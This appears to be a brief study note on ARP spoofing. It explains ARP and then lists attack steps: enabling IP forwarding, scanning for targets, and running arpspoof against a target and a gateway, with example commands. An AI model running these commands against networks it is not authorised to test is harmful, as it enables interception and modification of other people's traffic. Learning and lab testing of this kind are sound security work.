                ARP SPOOFING
            =====================
- ARP is used to map IP addresses to MAC addresses. 
- When a device wants to communicate with another device on the same network, 
    it sends an ARP request asking "Who has IP address X?" 
    The device with that IP address replies with its MAC address, 
    allowing communication to proceed.

ARP spoofing involves sending falsified ARP messages to trick devices on the network into associating the attacker's MAC address with the IP address of another device. 
This allows the attacker to intercept and modify traffic between the targeted devices.


                ARP SPOOFING ATTACKS
            ===========================
1) Enable IP Forwarding
    - This allows your machine to act as a router and forward traffic between the targeted devices.

        EG.
            sudo sysctl -w net.ipv4.ip_forward=1


2) Find target IP Addresses.
    -Use tools like arp-scan or nmap to discover devices on the network and their IP addresses.


3) Run ARP Spoofing.
    - Use arpspoof to send falsified ARP messages to the target devices.

        EG.
            sudo arpspoof -i <interface> -t <target_ip> <gateway_ip>


                - `-i <interface>` : Specify the network interface to use.
                - `-t <target_ip>` : Specify the IP address of the target device.
                - `<gateway_ip>` : Specify the IP address of the gateway/router.

            sudo arpspoof -i wlp2s0 -t 192.168.1.100 192.168.1.1
